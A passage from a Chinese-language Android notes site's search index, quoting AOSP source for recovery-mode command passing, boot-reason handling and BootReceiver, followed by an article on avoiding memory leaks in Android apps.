} 609 // c10. send \"100\" status 610 write_status_to_socket(100, socket); 611 return true; 612 } 613 621 int main(int argc, char** argv) { 622 enum { UNCRYPT, SETUP_BCB, CLEAR_BCB, UNCRYPT_DEBUG } action; 623 const char* input_path = nullptr; 624 const char* map_file = CACHE_BLOCK_MAP.c_str(); 625 626 if (argc == 2 && strcmp(argv[1], \"--clear-bcb\") == 0) { 627 action = CLEAR_BCB; 628 } else if (argc == 2 && strcmp(argv[1], \"--setup-bcb\") == 0) { 629 action = SETUP_BCB; 630 } else if (argc == 1) { 631 action = UNCRYPT; 632 } else if (argc == 3) { 633 input_path = argv[1]; 634 map_file = argv[2]; 635 action = UNCRYPT_DEBUG; 636 } else { 637 usage(argv[0]); 638 return 2; 639 } ... // c3. The socket is created by init when starting the service. uncrypt 659 // will use the socket to communicate with its caller. 660 android::base::unique_fd service_socket(android_get_control_socket(UNCRYPT_SOCKET.c_str())); 661 if (service_socket == -1) { 662 PLOG(ERROR) << \"failed to open socket \\\"\" << UNCRYPT_SOCKET << \"\\\"\"; 663 log_uncrypt_error_code(kUncryptSocketOpenError); 664 return 1; 665 } 666 fcntl(service_socket, F_SETFD, FD_CLOEXEC); 667 668 if (listen(service_socket, 1) == -1) { 669 PLOG(ERROR) << \"failed to listen on socket \" << service_socket.get(); 670 log_uncrypt_error_code(kUncryptSocketListenError); 671 return 1; 672 } 673 674 android::base::unique_fd socket_fd(accept4(service_socket, nullptr, nullptr, SOCK_CLOEXEC)); 675 if (socket_fd == -1) { 676 PLOG(ERROR) << \"failed to accept on socket \" << service_socket.get(); 677 log_uncrypt_error_code(kUncryptSocketAcceptError); 678 return 1; 679 } 680 681 bool success = false; 682 switch (action) { 683 case UNCRYPT: 684 success = uncrypt_wrapper(input_path, map_file, socket_fd); 685 break; 686 case SETUP_BCB: 687 success = setup_bcb(socket_fd); 688 break; 689 case CLEAR_BCB: 690 success = clear_bcb(socket_fd); 691 break; 692 default: // Should never happen. 693 LOG(ERROR) << \"Invalid uncrypt action code: \" << action; 694 return 1; 695 } 696","title":"6 \u547d\u4ee4\u4f20\u9012"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#7","text":"\u5f00\u53d1\u677f\u4e0a /system/etc/init/bootstat.rc \u5bf9\u5e94\u5982\u4e0b\u6587\u4ef6, Android\u901a\u8fc7\u4e09\u4e2a\u5c5e\u6027\u6765\u786e\u5b9a\u542f\u52a8\u539f\u56e0\u3002 - ro.boot.bootreason \uff1a\u7cfb\u7edf\u542f\u52a8\u8fc7\u7a0b\u4e2d\uff0cInit\u8fdb\u7a0b\u4f1a\u5c06\u5185\u6838\u542f\u52a8\u547d\u4ee4\u884c\u4e2d\u7684 androidboot.bootreason=<reason> \u8f6c\u5316\u4e3a ro.boot.bootreason \u3002\u542f\u52a8\u547d\u4ee4\u884c\u4e2d\u7684 bootreason \u7531\u4e00\u822c\u82af\u7247\u4f9b\u5e94\u5546\u63d0\u4f9b\uff0c\u5185\u6838\u5728\u65ad\u7535\u524d\u4f1a\u5c06\u542f\u52a8\u539f\u56e0\u5199\u5165\u4e13\u7528\u7684\u786c\u4ef6\u8d44\u6e90\u6216\u7ea6\u5b9a\u7684\u5185\u5b58\u5730\u5740\u3002\u4e0b\u6b21\u542f\u52a8\u65f6\uff0cBootloader\u5c31\u53ef\u4ee5\u8bfb\u53d6\u76f8\u5e94\u7684\u8d44\u6e90\u6765\u786e\u5b9a\u542f\u52a8\u539f\u56e0\uff0c\u7136\u540e\u6dfb\u52a0\u5230\u5185\u6838\u542f\u52a8\u547d\u4ee4\u884c\u4e2d\u3002\u5982\u679c\u82af\u7247\u4f9b\u5e94\u5546\u4e0d\u652f\u6301\u542f\u52a8\u539f\u56e0\u5199\u5165\uff0c androidboot.bootreason \u5c31\u53ef\u80fd\u4e0d\u5b58\u5728\u3002 - sys.boot.reason \uff1a\u7cfb\u7edf\u542f\u52a8\u65f6\u5148\u5c06 ro.boot.bootreason \u590d\u5236\u7ed9 sys.boot.reason \u3002\u56e0\u4e3a ro.boot.bootreason \u53ef\u80fd\u4e0d\u5b58\u5728\uff0c\u6216\u8005\u53ef\u80fd\u63d0\u4f9b\u4e0d\u51c6\u786e\u3001\u4e0d\u53ef\u89e3\u6790\u6216\u4e0d\u5408\u89c4\u8303\u7684\u4fe1\u606f\uff0c\u5728\u542f\u52a8\u5b8c\u6210\u540e\u4f1a\u8fdb\u4e00\u6b65\u66f4\u65b0 sys.boot.reason \u3002\u66f4\u65b0\u540e\u7684 sys.boot.reason \u5c06\u63d0\u4f9b\u51c6\u786e\u53ef\u9760\u7684\u3001\u7b26\u5408\u89c4\u8303\u7684\u542f\u52a8\u539f\u56e0\u3002 - persist.sys.boot.reason \uff1aAndroid\u7cfb\u7edf\u5728\u91cd\u542f\u524d\u4f1a\u5c06\u91cd\u542f\u539f\u56e0\u5199\u5165\u5230 persist.sys.boot.reason \u4e2d\u3002\u8fd9\u4e2a\u5c5e\u6027\u53ef\u4ee5\u7528\u6765\u5728 ro.boot.bootreason \u4e0d\u5b58\u5728\u65f6\uff0c\u534f\u52a9\u786e\u5b9a\u542f\u52a8\u539f\u56e0\u3002 Bootstat\u5bf9sys.boot.reason\u5904\u7406\u7684\u7b80\u5355\u6d41\u7a0b\u5982\u4e0b\uff0c - \u8bfb\u53d6ro.boot.bootreason\uff0c\u5c06\u5176\u8f6c\u5316\u4e3a\u7b26\u5408\u89c4\u8303\u7684reason\u3002 - \u5982\u679creason\u662fwatchdog\uff0c\u68c0\u67e5\u662f\u5426\u9700\u8981\u589e\u52a0security\u6807\u7b7e\u3002 - \u5982\u679creason\u662fkernel_panic\uff0c\u4ecelast klog\u4e2d\u67e5\u627e\u8be6\u7ec6\u4fe1\u606f\u3002 - \u5982\u679creason\u5c5e\u4e8e\u5f31\u96c6\uff08\u5305\u542b\u7a7a\u503c\uff09\uff0c\u4ecelast klog\u4e2d\u67e5\u627e\u4fe1\u606f\uff0c\u68c0\u67e5\u662f\u5426\u7535\u6c60\u8017\u5c3d\u5f15\u8d77\u6b7b\u673a\uff0c\u6839\u636epersist.sys.boot.reason\u4fee\u6b63reason\u3002 - \u5982\u679c\u4e0a\u8ff0\u64cd\u4f5c\u4f9d\u7136\u65e0\u6cd5\u786e\u5b9areason\uff0c\u5c06\u503c\u8bbe\u7f6e\u4e3areboot, \u3002 - \u5982\u679creason\u5c5e\u4e8e\u5185\u6838\u96c6\uff0c\u91cd\u5199persist.sys.boot.reason\u3002 http://www.aospxref.com/android-11.0.0_r21/xref/system/core/bootstat/bootstat.rc 3 # Mirror bootloader boot reason to system boot reason 4 # ro.boot.bootreason should be set by init already 5 # before post-fs trigger 6 on post-fs && property:ro.boot.bootreason=* 7 setprop sys.boot.reason ${ro.boot.bootreason} 70 # Set boot reason 71 on property:ro.persistent_properties.ready=true 72 # Converts bootloader boot reason and persist.sys.boot.reason to system boot reason 73 # Need go after persist peroperties are loaded which is right before zygote-start trigger 74 exec_background - system log -- /system/bin/bootstat --set_system_boot_reason 76 # Record boot complete metrics. 77 on property:sys.boot_completed=1 && property:sys.bootstat.first_boot_completed=0 78 # Record boot_complete and related stats (decryption, etc). 79 # Record the boot reason. 80 # Record time since factory reset. 81 # Log all boot events. 82 exec_background - system log -- /system/bin/bootstat --record_boot_complete --record_boot_reason --record_time_since_factory_reset -l 83 setprop sys.bootstat.first_boot_completed 1 http://www.aospxref.com/android-11.0.0_r21/xref/system/core/bootstat/bootstat.cpp 1059 // Is there a controlled shutdown hint in last_reboot_reason_property? 1060 if (isBluntRebootReason(ret)) { 1061 // Content buffer no longer will have console data. Beware if more 1062 // checks added below, that depend on parsing console content. 1063 if (!android::base::ReadFileToString(last_reboot_reason_file, &content)) { 1064 content = android::base::GetProperty(last_reboot_reason_property, \"\"); 1065 } 1066 transformReason(content); 1232 void SetSystemBootReason() { 1233 const auto bootloader_boot_reason = 1234 android::base::GetProperty(bootloader_reboot_reason_property, \"\"); 1235 const std::string system_boot_reason(BootReasonStrToReason(bootloader_boot_reason)); 1236 // Record the scrubbed system_boot_reason to the property 1237 BootReasonAddToHistory(system_boot_reason); 1238 // Shift last_reboot_reason_property to last_last_reboot_reason_property 1239 std::string last_boot_reason; 1240 if (!android::base::ReadFileToString(last_reboot_reason_file, &last_boot_reason)) { 1241 PLOG(ERROR) << \"Failed to read \" << last_reboot_reason_file; 1242 last_boot_reason = android::base::GetProperty(last_reboot_reason_property, \"\"); 1243 LOG(INFO) << \"Value of \" << last_reboot_reason_property << \" : \" << last_boot_reason; 1244 } else { 1245 LOG(INFO) << \"Last reboot reason read from \" << last_reboot_reason_file << \" : \" 1246 << last_boot_reason << \". Last reboot reason read from \" 1247 << last_reboot_reason_property << \" : \" 1248 << android::base::GetProperty(last_reboot_reason_property, \"\"); 1249 } 1250 if (last_boot_reason.empty() || isKernelRebootReason(system_boot_reason)) { 1251 last_boot_reason = system_boot_reason; 1252 } else { 1253 transformReason(last_boot_reason); 1254 } 1255 LOG(INFO) << \"Normalized last reboot reason : \" << last_boot_reason; 1256 android::base::SetProperty(last_last_reboot_reason_property, last_boot_reason); 1257 android::base::SetProperty(last_reboot_reason_property, \"\"); 1258 if (unlink(last_reboot_reason_file) != 0) { 1259 PLOG(ERROR) << \"Failed to unlink \" << last_reboot_reason_file; 1260 } 1261 }","title":"7 \u5c5e\u6027\u8bbe\u7f6e/\u53c2\u6570\u4f20\u9012"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#8","text":"http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/core/res/AndroidManifest.xml 5271 5272 <receiver android:name=\"com.android.server.BootReceiver\" 5273 android:systemUserOnly=\"true\"> 5274 <intent-filter android:priority=\"1000\"> 5275 <action android:name=\"android.intent.action.BOOT_COMPLETED\" /> 5276 </intent-filter> 5277 </receiver> http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/core/java/com/android/server/BootReceiver.java 65 public class BootReceiver extends BroadcastReceiver { 124 @Override 125 public void onReceive(final Context context, Intent intent) { 126 // Log boot events in the background to avoid blocking the main thread with I/O 127 new Thread() { 128 @Override 129 public void run() { 130 try { 131 logBootEvents(context); 198 private void logBootEvents(Context ctx) throws IOException { 199 final DropBoxManager db = (DropBoxManager) ctx.getSystemService(Context.DROPBOX_SERVICE); 200 final String headers = getBootHeadersToLogAndUpdate(); 201 final String bootReason = SystemProperties.get(\"ro.boot.bootreason\", null); 202 203 String recovery = RecoverySystem.handleAftermath(ctx); 204 if (recovery != null && db != null) { 205 db.addText(\"SYSTEM_RECOVERY_LOG\", headers + recovery); 206 } 207 208 String lastKmsgFooter = \"\"; 209 if (bootReason != null) { 210 lastKmsgFooter = new StringBuilder(512) 211 .append(\"\\n\") 212 .append(\"Boot info:\\n\") 213 .append(\"Last boot reason: \").append(bootReason).append(\"\\n\") 214 .toString(); 215 } 216 217 HashMap<String, Long> timestamps = readTimestamps(); 218 219 if (SystemProperties.getLong(\"ro.runtime.firstboot\", 0) == 0) { 220 if (StorageManager.inCryptKeeperBounce()) { 221 // Encrypted, first boot to get PIN/pattern/password so data is tmpfs 222 // Don't set ro.runtime.firstboot so that we will do this again 223 // when data is properly mounted 224 } else { 225 String now = Long.toString(System.currentTimeMillis()); 226 SystemProperties.set(\"ro.runtime.firstboot\", now); 227 } 228 if (db != null) db.addText(\"SYSTEM_BOOT\", headers); 229 230 // Negative sizes mean to take the *tail* of the file (see FileUtils.readTextFile()) 231 addLastkToDropBox(db, timestamps, headers, lastKmsgFooter, 232 \"/proc/last_kmsg\", -LASTK_LOG_SIZE, \"SYSTEM_LAST_KMSG\"); 233 addLastkToDropBox(db, timestamps, headers, lastKmsgFooter, 234 \"/sys/fs/pstore/console-ramoops\", -LASTK_LOG_SIZE, \"SYSTEM_LAST_KMSG\"); 235 addLastkToDropBox(db, timestamps, headers, lastKmsgFooter, 236 \"/sys/fs/pstore/console-ramoops-0\", -LASTK_LOG_SIZE, \"SYSTEM_LAST_KMSG\"); 237 addFileToDropBox(db, timestamps, headers, \"/cache/recovery/log\", -LOG_SIZE, 238 \"SYSTEM_RECOVERY_LOG\"); 239 addFileToDropBox(db, timestamps, headers, \"/cache/recovery/last_kmsg\", 240 -LOG_SIZE, \"SYSTEM_RECOVERY_KMSG\"); 241 addAuditErrorsToDropBox(db, timestamps, headers, -LOG_SIZE, \"SYSTEM_AUDIT\"); 242 } else { 243 if (db != null) db.addText(\"SYSTEM_RESTART\", headers); 244 } 245 // log always available fs_stat last so that logcat collecting tools can wait until 246 // fs_stat to get all file system metrics. 247 logFsShutdownTime(); 248 logFsMountTime(); 249 addFsckErrorsToDropBoxAndLogFsStat(db, timestamps, headers, -LOG_SIZE, \"SYSTEM_FSCK\"); 250 logSystemServerShutdownTimeMetrics(); 251 252 // Scan existing tombstones (in case any new ones appeared) 253 File[] tombstoneFiles = TOMBSTONE_DIR.listFiles(); 254 for (int i = 0; tombstoneFiles != null && i < tombstoneFiles.length; i++) { 255 if (tombstoneFiles[i].isFile()) { 256 addFileToDropBox(db, timestamps, headers, tombstoneFiles[i].getPath(), 257 LOG_SIZE, \"SYSTEM_TOMBSTONE\"); 258 } 259 } 260 261 writeTimestamps(timestamps); 262 263 // Start watching for new tombstone files; will record them as they occur. 264 // This gets registered with the singleton file observer thread. 265 sTombstoneObserver = new FileObserver(TOMBSTONE_DIR.getPath(), FileObserver.CREATE) { 266 @Override 267 public void onEvent(int event, String path) { 268 HashMap<String, Long> timestamps = readTimestamps(); 269 try { 270 File file = new File(TOMBSTONE_DIR, path); 271 if (file.isFile() && file.getName().startsWith(\"tombstone_\")) { 272 addFileToDropBox(db, timestamps, headers, file.getPath(), LOG_SIZE, 273 TAG_TOMBSTONE); 274 } 275 } catch (IOException e) { 276 Slog.e(TAG, \"Can't log tombstone\", e); 277 } 278 writeTimestamps(timestamps); 279 } 280 }; 281 282 sTombstoneObserver.startWatching(); 283 }","title":"8 \u5b8c\u6210\u542f\u52a8"},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/","text":"android\u624b\u673a\u7ed9\u5e94\u7528\u5206\u914d\u7684\u5185\u5b58\u901a\u5e38\u662f8\u5146\u5de6\u53f3\uff0c\u5982\u679c\u5904\u7406\u5185\u5b58\u5904\u7406\u4e0d\u5f53\u5f88\u5bb9\u6613\u9020\u6210OutOfMemoryError\uff0c\u6211\u4eec\u7684\u4ea7\u54c1\u51fa\u73b0\u6700\u591a\u7684\u9519\u8bef\u4e5f\u662fOutOfMemoryError\u7684\u5f02\u5e38\uff0c \u5728\u89e3\u51b3\u8fd9\u4e2a\u5f02\u5e38\u65f6\u5728\u7f51\u4e0a\u53d1\u73b0\u5f88\u591a\u5173\u4e8eOutOfMemoryError\u7684\u539f\u56e0\u7684\u4ecb\u7ecd\u3002 OutOfMemoryError\u4e3b\u8981\u7531\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5\u9020\u6210\uff1a 1.\u6570\u636e\u5e93\u7684cursor\u6ca1\u6709\u5173\u95ed\u3002 \u64cd\u4f5cSqlite\u6570\u636e\u5e93\u65f6\uff0cCursor\u662f\u6570\u636e\u5e93\u8868\u4e2d\u6bcf\u4e00\u884c\u7684\u96c6\u5408\uff0cCursor\u63d0\u4f9b\u4e86\u5f88\u591a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u8bfb\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u503c\uff0c \u53ef\u4ee5\u6839\u636e\u7d22\u5f15\uff0c\u5217\u540d\u7b49\u83b7\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u503c\uff0c\u901a\u8fc7\u6e38\u6807\u7684\u65b9\u5f0f\u53ef\u4ee5\u8c03\u7528moveToNext()\u79fb\u5230\u4e0b\u4e00\u884c \u5f53\u6211\u4eec\u64cd\u4f5c\u5b8c\u6570\u636e\u5e93\u540e\uff0c\u4e00\u5b9a\u8981\u8bb0\u5f97\u8c03\u7528Cursor\u5bf9\u8c61\u7684close()\u6765\u5173\u95ed\u6e38\u6807\uff0c\u91ca\u653e\u8d44\u6e90\u3002 2.\u6784\u9020adapter\u6ca1\u6709\u4f7f\u7528\u7f13\u5b58contentview\u3002 \u5728\u7ee7\u627fBaseAdapter\u65f6\u4f1a\u8ba9\u6211\u4eec\u91cd\u5199getView(int position, View convertView, ViewGroup parent)\u65b9\u6cd5\uff0c \u7b2c\u4e8c\u4e2a\u53c2\u6570convertView\u5c31\u662f\u6211\u4eec\u8981\u7528\u5230\u7684\u91cd\u7528\u7684\u5bf9\u8c61 Java\u4ee3\u7801 1. @Override 2. public View getView(int position, View convertView, ViewGroup parent) { 3. ViewHolder vHolder = null; 5. if (convertView == null) { 6. convertView = inflater.inflate(..., null); 8. vHolder = new ViewHolder(); 9. vHolder.img= (ImageView) convertView.findViewById(...); 10. vHolder.tv= (TextView) convertView 11. .findViewById(...); 13. convertView.setTag(vHolder); 14. } else { 16. vHolder = (ViewHolder) convertView.getTag(); 17. } 19. vHolder.img.setImageBitmap(...); 20. vHolder.tv.setText(...); 21. return convertView; 22. } 24. static class ViewHolder { 25. TextView tv; 26. ImageView img; 27. } \u8fd9\u91cc\u53ea\u8bb2\u4f7f\u7528\u65b9\u6cd5\uff0c\u5177\u4f53\u6027\u80fd\u6d4b\u8bd5\u6587\u7ae0\u8bf7\u89c1\uff1a ListView\u4e2dgetView\u7684\u539f\u7406\uff0b\u5982\u4f55\u5728ListView\u4e2d\u653e\u7f6e\u591a\u4e2aitem http://www.cnblogs.com/xiaowenji/archive/2010/12/08/1900579.html Android\u5f00\u53d1\u4e4bListView\u9002\u914d\u5668\uff08Adapter\uff09\u4f18\u5316 http://shinfocom.iteye.com/blog/1231511 3.\u8c03\u7528registerReceiver()\u540e\u672a\u8c03\u7528unregisterReceiver(). \u5e7f\u64ad\u63a5\u6536\u8005\uff08BroadcastReceiver\uff09\u7ecf\u5e38\u5728\u5e94\u7528\u4e2d\u7528\u5230\uff0c\u53ef\u4ee5\u5728\u591a\u7ebf\u7a0b\u4efb\u52a1\u5b8c\u6210\u540e\u53d1\u9001\u5e7f\u64ad\u901a\u77e5UI\u66f4\u65b0\uff0c\u4e5f\u53ef\u4ee5\u63a5\u6536\u7cfb\u7edf\u5e7f\u64ad\u5b9e\u73b0\u4e00\u4e9b\u529f\u80fd \u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u7684\u65b9\u5f0f\u6ce8\u518c\uff1a IntentFilter postFilter = new IntentFilter(); postFilter.addAction(getPackageName() + \".background.job\"); this.registerReceiver(receiver, postFilter); \u5f53\u6211\u4eecActivity\u4e2d\u4f7f\u7528\u4e86registerReceiver()\u65b9\u6cd5\u6ce8\u518c\u4e86BroadcastReceiver\uff0c\u4e00\u5b9a\u8981\u5728Activity\u7684\u751f\u547d\u5468\u671f\u5185\u8c03\u7528unregisterReceiver()\u65b9\u6cd5\u53d6\u6d88\u6ce8\u518c \u4e5f\u5c31\u662f\u8bf4registerReceiver()\u548cunregisterReceiver()\u65b9\u6cd5\u4e00\u5b9a\u8981\u6210\u5bf9\u51fa\u73b0\uff0c\u901a\u5e38\u6211\u4eec\u53ef\u4ee5\u91cd\u5199Activity\u7684onDestory()\u65b9\u6cd5\uff1a Java\u4ee3\u7801 1. @Override 2. protected void onDestroy() { 3. this.unregisterReceiver(receiver); 4. super.onDestroy(); 5. } 4.\u672a\u5173\u95edInputStream/OutputStream\u3002 \u8fd9\u4e2a\u5c31\u4e0d\u591a\u8bf4\u4e86\uff0c\u6211\u4eec\u64cd\u4f5c\u5b8c\u8f93\u5165\u8f93\u51fa\u6d41\u90fd\u8981\u5173\u95ed\u6d41 5.Bitmap\u4f7f\u7528\u540e\u672a\u8c03\u7528recycle()\u3002 \u56fe\u7247\u5904\u7406\u4e0d\u597d\u662f\u9020\u6210\u5185\u5b58\u6ea2\u51fa\u7684\u53c8\u4e00\u4e2a\u5934\u53f7\u539f\u56e0\uff0c\uff08\u5728\u6211\u4eec\u7684\u4ea7\u54c1\u4e2d\u4e5f\u6709\u4f53\u73b0)\uff0c \u5f53\u6211\u4eec\u5904\u7406\u5b8c\u56fe\u7247\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528recycle()\u65b9\u6cd5\u6765\u56de\u6536\u56fe\u7247\u5bf9\u8c61 Java\u4ee3\u7801 1. if(!bitmap.isRecycled()) 2. { 3. bitmap.recycle() 4. } \u9664\u6b64\u4e4b\u5916\uff1a \u76f4\u63a5\u4f7f\u7528ImageView\u663e\u793abitmap\u4f1a\u5360\u7528\u8f83\u591a\u8d44\u6e90\uff0c\u7279\u522b\u662f\u56fe\u7247\u8f83\u5927\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u5bfc\u81f4\u5d29\u6e83\u3002 \u4f7f\u7528BitmapFactory.Options\u8bbe\u7f6einSampleSize, \u8fd9\u6837\u505a\u53ef\u4ee5\u51cf\u5c11\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u8981\u6c42\u3002 \u5c5e\u6027\u503cinSampleSize\u8868\u793a\u7f29\u7565\u56fe\u5927\u5c0f\u4e3a\u539f\u59cb\u56fe\u7247\u5927\u5c0f\u7684\u51e0\u5206\u4e4b\u4e00\uff0c\u5373\u5982\u679c\u8fd9\u4e2a\u503c\u4e3a2\uff0c\u5219\u53d6\u51fa\u7684\u7f29\u7565\u56fe\u7684\u5bbd\u548c\u9ad8\u90fd\u662f\u539f\u59cb\u56fe\u7247\u76841/2\uff0c\u56fe\u7247\u5927\u5c0f\u5c31\u4e3a\u539f\u59cb\u5927\u5c0f\u76841/4\u3002 BitmapFactory.Options bitmapFactoryOptions = new BitmapFactory.Options(); bitmapFactoryOptions.inJustDecodeBounds = true; bitmapFactoryOptions.inSampleSize = 2; // \u8fd9\u91cc\u4e00\u5b9a\u8981\u5c06\u5176\u8bbe\u7f6e\u56defalse\uff0c\u56e0\u4e3a\u4e4b\u524d\u6211\u4eec\u5c06\u5176\u8bbe\u7f6e\u6210\u4e86true // \u8bbe\u7f6einJustDecodeBounds\u4e3atrue\u540e\uff0cdecodeFile\u5e76\u4e0d\u5206\u914d\u7a7a\u95f4\uff0c\u5373\uff0cBitmapFactory\u89e3\u7801\u51fa\u6765\u7684Bitmap\u4e3aNull,\u4f46\u53ef\u8ba1\u7b97\u51fa\u539f\u59cb\u56fe\u7247\u7684\u957f\u5ea6\u548c\u5bbd\u5ea6 options.inJustDecodeBounds = false; Bitmap bmp = BitmapFactory.decodeFile(sourceBitmap, options); 6.Context\u6cc4\u6f0f\u3002 \u8fd9\u662f\u4e00\u4e2a\u5f88\u9690\u6666\u7684OutOfMemoryError\u7684\u60c5\u51b5\u3002\u5148\u770b\u4e00\u4e2aAndroid\u5b98\u7f51\u63d0\u4f9b\u7684\u4f8b\u5b50\uff1a Java\u4ee3\u7801 1. private static Drawable sBackground; 2. @Override 3. protected void onCreate(Bundle state) { 4. super.onCreate(state); 6. TextView label = new TextView(this); 7. label.setText(\"Leaks are bad\"); 9. if (sBackground == null) { 10. sBackground = getDrawable(R.drawable.large\\_bitmap); 11. } 12. label.setBackgroundDrawable(sBackground); 14. setContentView(label); 15. } \u8fd9\u6bb5\u4ee3\u7801\u6548\u7387\u5f88\u5feb\uff0c\u4f46\u540c\u65f6\u53c8\u662f\u6781\u5176\u9519\u8bef\u7684\uff1b \u5728\u7b2c\u4e00\u6b21\u5c4f\u5e55\u65b9\u5411\u5207\u6362\u65f6\u5b83\u6cc4\u9732\u4e86\u4e00\u5f00\u59cb\u521b\u5efa\u7684Activity\u3002\u5f53\u4e00\u4e2aDrawable\u9644\u52a0\u5230\u4e00\u4e2a View\u4e0a\u65f6\uff0c View\u4f1a\u5c06\u5176\u4f5c\u4e3a\u4e00\u4e2acallback\u8bbe\u5b9a\u5230Drawable\u4e0a\u3002\u4e0a\u8ff0\u7684\u4ee3\u7801\u7247\u6bb5\uff0c\u610f\u5473\u7740Drawable\u62e5\u6709\u4e00\u4e2aTextView\u7684\u5f15\u7528\uff0c \u800cTextView\u53c8\u62e5\u6709Activity\uff08Context\u7c7b\u578b\uff09\u7684\u5f15\u7528\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0cDrawable\u62e5\u6709\u4e86\u66f4\u591a\u7684\u5bf9\u8c61\u5f15\u7528\u3002\u5373\u4f7fActivity\u88ab \u9500\u6bc1\uff0c\u5185\u5b58\u4ecd\u7136\u4e0d\u4f1a\u88ab\u91ca\u653e\u3002 \u53e6\u5916\uff0c\u5bf9Context\u7684\u5f15\u7528\u8d85\u8fc7\u5b83\u672c\u8eab\u7684\u751f\u547d\u5468\u671f\uff0c\u4e5f\u4f1a\u5bfc\u81f4Context\u6cc4\u6f0f\u3002\u6240\u4ee5\u5c3d\u91cf\u4f7f\u7528Application\u8fd9\u79cdContext\u7c7b\u578b\u3002 \u8fd9\u79cdContext\u62e5\u6709\u548c\u5e94\u7528\u7a0b\u5e8f\u4e00\u6837\u957f\u7684\u751f\u547d\u5468\u671f\uff0c\u5e76\u4e14\u4e0d\u4f9d\u8d56Activity\u7684\u751f\u547d\u5468\u671f\u3002\u5982\u679c\u4f60\u6253\u7b97\u4fdd\u5b58\u4e00\u4e2a\u957f\u65f6\u95f4\u7684\u5bf9\u8c61\uff0c \u5e76\u4e14\u5176\u9700\u8981\u4e00\u4e2a Context\uff0c\u8bb0\u5f97\u4f7f\u7528Application\u5bf9\u8c61\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528Context.getApplicationContext()\u6216 Activity.getApplication()\u8f7b\u677e\u5f97\u5230Application\u5bf9\u8c61\u3002 \u6700\u8fd1\u9047\u5230\u4e00\u79cd\u60c5\u51b5\u5f15\u8d77\u4e86Context\u6cc4\u6f0f\uff0c\u5c31\u662f\u5728Activity\u9500\u6bc1\u65f6\uff0c\u91cc\u9762\u6709\u5176\u4ed6\u7ebf\u7a0b\u6ca1\u6709\u505c\u3002 \u603b\u7ed3\u4e00\u4e0b\u907f\u514dContext\u6cc4\u6f0f\u5e94\u8be5\u6ce8\u610f\u7684\u95ee\u9898\uff1a 1.\u4f7f\u7528Application\u8fd9\u79cdContext\u7c7b\u578b\u3002 2.\u6ce8\u610f\u5bf9Context\u7684\u5f15\u7528\u4e0d\u8981\u8d85\u8fc7\u5b83\u672c\u8eab\u7684\u751f\u547d\u5468\u671f\u3002 3.\u614e\u91cd\u7684\u4f7f\u7528\u201cstatic\u201d\u5173\u952e\u5b57\u3002 4.Context\u91cc\u5982\u679c\u6709\u7ebf\u7a0b\uff0c\u4e00\u5b9a\u8981\u5728onDestroy()\u91cc\u53ca\u65f6\u505c\u6389\u3002 7.static\u5173\u952e\u5b57 \u5f53\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u58f0\u660e\u6210static\u540e\uff0c\u5b83\u662f\u5c5e\u4e8e\u7c7b\u7684\u800c\u4e0d\u662f\u5c5e\u4e8e\u5bf9\u8c61\u7684\uff0c\u5982\u679c\u6211\u4eec\u5c06\u5f88\u5927\u7684\u8d44\u6e90\u5bf9\u8c61\uff08Bitmap\uff0ccontext\u7b49\uff09\u58f0\u660e\u6210static\uff0c\u90a3\u4e48\u8fd9\u4e9b\u8d44\u6e90\u4e0d\u4f1a\u968f\u7740\u5bf9\u8c61\u7684\u56de\u6536\u800c\u56de\u6536\uff0c \u4f1a\u4e00\u76f4\u5b58\u5728\uff0c\u6240\u4ee5\u5728\u4f7f\u7528static\u5173\u952e\u5b57\u5b9a\u4e49\u6210\u5458\u53d8\u91cf\u7684\u65f6\u5019\u8981\u614e\u91cd\u3002","title":"Android\u5185\u5b58\u6cc4\u9732\u4f18\u5316\u603b\u7ed3"},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#1cursor","text":"\u64cd\u4f5cSqlite\u6570\u636e\u5e93\u65f6\uff0cCursor\u662f\u6570\u636e\u5e93\u8868\u4e2d\u6bcf\u4e00\u884c\u7684\u96c6\u5408\uff0cCursor\u63d0\u4f9b\u4e86\u5f88\u591a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u8bfb\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u503c\uff0c \u53ef\u4ee5\u6839\u636e\u7d22\u5f15\uff0c\u5217\u540d\u7b49\u83b7\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u503c\uff0c\u901a\u8fc7\u6e38\u6807\u7684\u65b9\u5f0f\u53ef\u4ee5\u8c03\u7528moveToNext()\u79fb\u5230\u4e0b\u4e00\u884c \u5f53\u6211\u4eec\u64cd\u4f5c\u5b8c\u6570\u636e\u5e93\u540e\uff0c\u4e00\u5b9a\u8981\u8bb0\u5f97\u8c03\u7528Cursor\u5bf9\u8c61\u7684close()\u6765\u5173\u95ed\u6e38\u6807\uff0c\u91ca\u653e\u8d44\u6e90\u3002","title":"1.\u6570\u636e\u5e93\u7684cursor\u6ca1\u6709\u5173\u95ed\u3002"},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#2adaptercontentview","text":"\u5728\u7ee7\u627fBaseAdapter\u65f6\u4f1a\u8ba9\u6211\u4eec\u91cd\u5199getView(int position, View convertView, ViewGroup parent)\u65b9\u6cd5\uff0c 